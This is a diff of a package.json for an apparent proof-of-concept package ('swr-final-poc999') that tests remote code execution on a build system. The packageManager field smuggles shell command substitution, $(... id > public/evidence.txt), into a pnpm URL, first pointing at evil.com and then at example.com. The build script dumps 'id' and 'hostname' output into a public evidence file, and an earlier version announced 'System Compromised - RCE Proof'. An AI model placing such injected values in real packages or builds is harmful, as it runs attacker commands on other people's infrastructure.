@@ -2,10 +2,7 @@
   "name": "swr-final-poc999",
   "version": "1.0.0",
   "scripts": {
-    "build": "mkdir -p public && id > public/evidence.txt && hostname >> public/evidence.txt && echo '<h1>System Compromised - RCE Proof</h1>' > public/index.html"
+    "build": "mkdir -p public && id > public/evidence.txt && hostname >> public/evidence.txt && echo 'Success' > public/index.html"
   },
-  "packageManager": "pnpm@https://evil.com/$(mkdir -p public && id > public/evidence.txt)",
-  "devDependencies": {
-    "turbo": "latest"
-  }
+  "packageManager": "pnpm@https://example.com/$(id>public/evidence.txt)"
 }
